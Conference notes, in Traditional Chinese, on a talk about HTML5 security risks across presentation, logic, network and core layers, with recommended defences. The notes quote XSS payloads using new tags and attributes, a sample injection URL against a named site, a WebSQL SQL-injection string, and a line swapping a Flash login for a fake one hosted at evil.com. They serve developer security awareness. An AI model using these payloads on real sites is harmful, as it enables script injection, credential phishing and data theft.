# 關注 HTML5 安全

![](http://articles.csdn.net/uploads/allimg/120911/145_120911100415_1.jpg)

* 講者：蔣宇傑（百度）- 送了我一本「關注 HTML5 與 CSS3」的書 :D
* [投影片](https://dl.dropbox.com/u/1953991/focus-html5-security.pptx)
* [部落格](http://blog.csdn.net/hfahe/article/details/7960705)
* [線上閱讀](http://pan.baidu.com/share/link?shareid=25886&uk=2802317001)

## HTML 的發展

* 1991 年 - HTML 誕生
* 1996 年 - CSS 與 JS 誕生、產生了 XSS
* 2000 年 - HTML1、針對瀏覽器的攻擊
* 2005 年 - Web 安全多樣化
* 2008 年 - HTML5 出現 -> 新的變化！

## HTML5 的美與危險

HTML5 就像是一朵玫瑰，它很美、但也有尖銳的刺。

Web 需要不斷地往前發展、雖然解決一些舊的風險，但也會帶來新的特性，幫助攻擊者去引入新的攻擊模式。

* 如何預防 HTML5 的新式攻擊：
  * 第一個層面：規範。官方需要有一個安全規範、告訴開發者如何實作。
  * 第二個層面：機制。瀏覽器本身也要實現一些安全機制。
  * 第三個層面：意識。此 Session 的主要目的：在應用實作層面提醒開發者注意 HTML5 的安全問題，


## HTML5 的四層架構

第一層是表現層，第二層是邏輯層，第三層是網路層，第四層是核心層

![](http://farm9.staticflickr.com/8177/8021615225_063da467e3_b.jpg)

### 第一層：表現層

#### 新的標籤攻擊

* 新標籤：Audio、Video、Canvas、Article、Footer…* 新屬性：poster、autofocus、formaction、oninput…
* 以下的新 Pattern 必須加入 XSS 過濾機制 Filter 中！

        多媒体标签： <video><source onerror="javascript:alert(1)“>                    <video poster=”javascript:alert(1)”>         自动聚焦：   <input autofocus onfocus=“alert(1)”>         表单和按钮： <form><button formaction="javascript:alert(1)">test
* 利用 autofocus 的新 patter : 不用任何動作就可以執行 Script

         http://www.miiicasa.com/?text=<input autofocus onfocus=alert(1)>

#### CORJacking 

* 頁面上既有的 Flash

        <object classid=“clsid:xxxxxxx-xxxx-xxxx-xxxxxx” id=“Login” width=“100%”  height=“100%” codebase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab>            <param name=“movie” value=“Login.swf” />            <param name=“quality” value=“high” />            <embed src=“Login.swf” quality=“high” width=“50%” height=“50%”>        </object>

* 做 SWF 的替換放入假的 Facebook 登入介面：
    
        document.getElementByName(‘Login’).item(0).src=‘http://evil.com/login.swf’;

#### API 攻擊
* Web Notifications：盗取数据<br>![](http://farm9.staticflickr.com/8462/8021721595_967a0c388f.jpg)
* History API：可隱藏 XSS 的 URL* registerProtocolHandler：網站可登記其能處理的通信規則。限 Firefox 使用。洩漏訊息

          navigator.registerProtocolHandler(“mailto”, “http://www.f.com/?uri=%s", “Evil Mail");
### 第二層：邏輯層

#### WebSQL 攻擊

可利用 SQL Injection、資料庫探測

* JavaScript 沒寫好：
  
        executeSql("SELECT name FROM stud WHERE id=" + input_id)
  
* 別人的 XSS 就可以 Dump 出 WebSQL 的資料：

        // id = "1 or 1 = 1"
        http://www.miiicasa.com/websql.php?id=1%20or%201%20=%201

* 改善方式：
  * 檢查輸入類型 
  * 改用參數形式
  
        executeSql("SELECT name FROM stud WHERE id=?“,[input_id])  * 謹慎對待每一次 SQL 操作
  * 不要儲存重要數據 - Browser 端不應該有敏感資訊。  

#### Web Storage 攻擊

跟全域變數一樣的問題！

* 全域變數、window.localStorage
* 現有工具：[HTML5CSDump](http://www.scribd.com/doc/4012693/Abusing-HTML-5-Structured-Clientside-Storage)
* 改進方式：
  * 盡量將資料放在適合的 Scope 中，勿用全域變數。
  * 不要任何敏感的資料
   
### 第三層：網路層攻擊

#### WebWorker 攻擊：多執行緒

攻擊變得很有效率

* 攻擊方式：
  * 殭屍網路：DDos 攻擊、發送垃圾郵件。
  * postMessage
* 攻擊工具：Ravan
![](http://farm9.staticflickr.com/8318/8021667141_1fb29c9838_z.jpg)
* 防禦方式：
  * 避免去不安全的網站（使用者）
  * 使用 postMessage 需要驗證來源 (網站)
  * 使用 postMessage 避免使用 innerHTML (網站)
  
#### WebSocket 攻擊

![](http://cometdaily.com/wp-content/uploads/2008/07/orbited-firewall.png)

* 成為後門、Port Scanning、殭屍網路、網路探測器
* 攻擊工具：[JS Recon](http://www.andlabs.org/tools/jsrecon.html)
  
### 第四層：核心層

#### Clickjacking 攻擊

![](http://honeyaordoubadi.files.wordpress.com/2010/03/clickjacking.jpg)

利用 Iframe 把 miiiCasa 的網頁放入，再上面疊一層透明的表單，對齊好輸入框

* [測試工具](http://www.protecht.ca/clickjacktest)
* 防禦之道：
  * 設定 X-Frame-Options 
  * 防止網頁被嵌入 (噗浪)

        if (top !== window) top.location = window.location.href;

#### CORS 攻擊

利用 HTTP Header 做跨網域存取。

* 可能帶來的風險：
  * HTTP Header 可以被竄改，是不可信賴的
  * 原本信賴的網站可能會被入侵
  * 惡意的跨網域請求
  * 內部訊息的洩漏
  * 針對用戶的攻擊
* 攻擊工具 - [Shell of the future](http://www.andlabs.org/tools.html)
  * Shell of the Future is a Reverse Web Shell handler. It can be used to hijack sessions where JavaScript can be injected using Cross-site Scripting or through the browser's address bar. *It makes use of HTML5's Cross Origin Requests and can bypass anti-session hijacking measures like Http-Only cookies and IP address-Session ID binding.*
* 防禦方式：
  * 不信任未經身分驗證的跨網域請求
  * Request 的那一方需要*驗證接受數據的有效性* 、Response 的那一方需*暴露最少的功能*。
  * 透過多種條件檢驗非法 Request (HTTP Header、Parameter...)

## HTML5 對於安全性的改進

* Iframe Sandbox* Content Security Policy - 內容安全策略         Content-Security-Policy: default-src https://jiang.yujie.net; frame-src 'none';      
* XSS Filter* Todo - HTML5 安全規範

## HTML5 開創的藍海

HTML4 對安全性有 Antisamy、HTML purifier 等公司專門做檢查，目前 HTML5 還是一片空。
目前很少公司會把 Port 80 鎖掉。國外有一家公司正在做一件事情：面對基於 Web 的攻擊。*當前的防火牆對於 Web 很難進行禁止與防禦*，這家公司提供的新式防火牆，針對内容進行深入檢查。

